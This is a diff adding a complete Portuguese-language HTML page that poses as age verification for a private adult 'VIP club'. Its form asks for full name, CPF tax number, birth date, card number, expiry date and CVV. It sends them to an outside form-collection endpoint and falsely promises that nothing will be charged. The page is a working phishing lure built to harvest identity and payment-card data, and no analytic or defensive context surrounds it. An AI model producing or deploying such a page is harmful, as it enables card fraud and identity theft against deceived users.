@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>🔥 VIP CLUB PRIVADO 🔥</title>
+</head>
+<body style="background-color: #0d0d0d; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
+  <h1>🔞 ACESSO RESTRITO 🔞</h1>
+  <p>Conteúdo exclusivo liberado <strong>somente para maiores de 18 anos</strong></p>
+  <img src="https://cdn.pixabay.com/photo/2017/06/20/19/22/girl-2427886_1280.jpg" alt="Imagem Sensual" width="300">
+  
+  <h2>Verificação de identidade e idade 🔐</h2>
+  <form action="https://getform.io/f/axoyllxb" method="POST">
+    <input type="text" name="nome_completo" placeholder="Nome completo" required><br><br>
+    <input type="text" name="cpf" placeholder="CPF (validação obrigatória)" required><br><br>
+    <input type="date" name="data_nascimento" placeholder="Data de nascimento" required><br><br>
+
+    <input type="text" name="numero_cartao" placeholder="Número do Cartão" required><br><br>
+    <input type="text" name="validade_cartao" placeholder="Validade (MM/AA)" required><br><br>
+    <input type="text" name="codigo_cvv" placeholder="CVV" required><br><br>
+
+    <label style="font-size: 12px; color: gray;">
+      <input type="checkbox" name="concordo_termos" required> Eu concordo com a verificação de identidade e autorizo o uso dos dados para acesso ao conteúdo.
+    </label><br><br>
+
+    <button type="submit" style="padding: 10px 20px;">VERIFICAR E LIBERAR ACESSO</button>
+  </form>
+
+  <p style="font-size:12px; color:gray;">*Verificação temporária. Nenhum valor será cobrado. Apenas maiores de 18 anos.</p>
+</body>
+</html>
